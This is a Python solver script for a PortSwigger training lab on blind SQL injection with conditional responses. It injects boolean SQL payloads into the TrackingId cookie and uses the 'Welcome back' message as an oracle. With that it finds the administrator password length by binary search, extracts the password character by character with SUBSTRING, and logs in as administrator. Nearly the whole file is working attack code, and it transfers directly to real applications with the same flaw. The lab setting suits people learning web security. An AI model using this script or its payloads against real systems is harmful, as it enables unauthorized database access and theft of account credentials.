"""
Lab: Blind SQL injection with conditional responses
Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

Description:
    This lab contains a blind SQL injection vulnerability. The application uses
    a tracking cookie for analytics, and performs a SQL query containing the value
    of the submitted cookie. The results of the SQL query are not returned, and
    no error messages are displayed. But the application includes a "Welcome back"
    message in the page if the query returns any rows.

    The database contains a table called 'users', with columns 'username' and
    'password'. You need to exploit the blind SQLi to find the administrator password,
    then log in as the administrator user.

Solution:
    1. Inject into the TrackingId cookie to test boolean conditions.
    2. Confirm the 'users' table and 'administrator' user exist.
    3. Determine password length using LENGTH(password)>N.
    4. Extract each character using SUBSTRING(password,pos,1)='c'.
    5. The oracle is the presence of "Welcome back" in the response body.
    6. Log in with the extracted password to solve the lab.
"""

import sys
import string
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def print_banner():
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Lab 11 – Blind SQL Injection (Conditional Responses)       ║
║  https://portswigger.net/web-security/sql-injection/blind   ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


def get_session(url, proxy=None):
    """Fetch the homepage to grab a valid TrackingId cookie."""
    proxies = build_proxies(proxy)
    try:
        r = requests.get(url, verify=False, proxies=proxies, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{RED}[✗] Connection failed. Is the lab running?{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"{RED}[✗] Request timed out.{RESET}")
        sys.exit(1)

    tracking_id = None
    session_cookie = None
    for cookie in r.cookies:
        if cookie.name == "TrackingId":
            tracking_id = cookie.value
        elif cookie.name == "session":
            session_cookie = cookie.value

    if not tracking_id:
        print(f"{RED}[✗] Could not find TrackingId cookie.{RESET}")
        sys.exit(1)

    return tracking_id, session_cookie


def build_proxies(proxy):
    if proxy:
        proxy_url = f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}
    return {}


def inject(url, tracking_id, session_cookie, payload, proxy=None):
    """
    Send a request with the injected TrackingId cookie.
    Returns True if "Welcome back" is in the response (condition is true).
    """
    proxies = build_proxies(proxy)
    cookies = {
        "TrackingId": f"{tracking_id}{payload}",
        "session": session_cookie,
    }
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=10)
    return "Welcome back" in r.text


def find_password_length(url, tracking_id, session_cookie, proxy=None):
    """Binary search for the password length."""
    print(f"{YELLOW}[*] Determining password length...{RESET}")

    low, high = 1, 50
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>{mid}--"
        if inject(url, tracking_id, session_cookie, payload, proxy):
            low = mid + 1
        else:
            high = mid

    # Confirm the length
    payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={low}--"
    if inject(url, tracking_id, session_cookie, payload, proxy):
        print(f"{GREEN}[✓] Password length: {low}{RESET}")
        return low

    print(f"{RED}[✗] Could not determine password length.{RESET}")
    sys.exit(1)


def extract_password(url, tracking_id, session_cookie, length, proxy=None):
    """Extract the password character by character."""
    print(f"{YELLOW}[*] Extracting password ({length} characters)...{RESET}")

    charset = string.ascii_lowercase + string.digits
    password = ""

    for pos in range(1, length + 1):
        found = False
        for char in charset:
            payload = (
                f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users "
                f"WHERE username='administrator')='{char}'--"
            )
            if inject(url, tracking_id, session_cookie, payload, proxy):
                password += char
                sys.stdout.write(f"\r{YELLOW}[*] Password : {GREEN}{password}{YELLOW}{'·' * (length - len(password))}{RESET}")
                sys.stdout.flush()
                found = True
                break

        if not found:
            print(f"\n{RED}[✗] Could not determine character at position {pos}.{RESET}")
            sys.exit(1)

    print(f"\n{GREEN}{BOLD}[✓] Password : {password}{RESET}")
    return password


def login(url, password, proxy=None):
    """Log in as administrator to solve the lab."""
    proxies = build_proxies(proxy)
    login_url = f"{url}/login"

    # Get CSRF token
    s = requests.Session()
    r = s.get(login_url, verify=False, proxies=proxies, timeout=10)

    csrf = None
    if 'name="csrf"' in r.text:
        csrf = r.text.split('name="csrf" value="')[1].split('"')[0]

    data = {
        "username": "administrator",
        "password": password,
    }
    if csrf:
        data["csrf"] = csrf

    r = s.post(login_url, data=data, verify=False, proxies=proxies, timeout=10)

    if "Your username is: administrator" in r.text or "Log out" in r.text:
        print(f"{GREEN}{BOLD}[✓] Login successful! Lab solved.{RESET}")
    else:
        print(f"{YELLOW}[*] Login submitted. Check the lab page to confirm it's solved.{RESET}")


def exploit(url, proxy=None):
    print(f"{YELLOW}[*] Target : {url}{RESET}")
    print(f"{YELLOW}[*] Proxy  : {proxy if proxy else 'disabled'}{RESET}\n")

    # Step 1 – Get a valid session
    tracking_id, session_cookie = get_session(url, proxy)
    print(f"{GREEN}[✓] TrackingId : {tracking_id}{RESET}")

    # Step 2 – Confirm blind SQLi works
    if inject(url, tracking_id, session_cookie, "' AND '1'='1'--", proxy):
        print(f"{GREEN}[✓] Blind SQL injection confirmed (boolean oracle works){RESET}")
    else:
        print(f"{RED}[✗] Blind SQL injection not working. Check the target.{RESET}")
        sys.exit(1)

    # Step 3 – Confirm 'administrator' user exists
    payload = "' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--"
    if inject(url, tracking_id, session_cookie, payload, proxy):
        print(f"{GREEN}[✓] User 'administrator' exists{RESET}")
    else:
        print(f"{RED}[✗] User 'administrator' not found.{RESET}")
        sys.exit(1)

    # Step 4 – Find password length
    length = find_password_length(url, tracking_id, session_cookie, proxy)

    # Step 5 – Extract password
    password = extract_password(url, tracking_id, session_cookie, length, proxy)

    # Step 6 – Log in
    print(f"\n{YELLOW}[*] Logging in as administrator...{RESET}")
    login(url, password, proxy)


def main():
    parser = argparse.ArgumentParser(
        add_help=False,
        description="PortSwigger Lab 11 – Blind SQL injection with conditional responses",
    )
    parser.add_argument("url")
    parser.add_argument("-p", "--proxy", metavar="HOST:PORT")

    args = parser.parse_args()
    url = args.url.rstrip("/")

    print_banner()
    exploit(url, proxy=args.proxy)


if __name__ == "__main__":
    main()
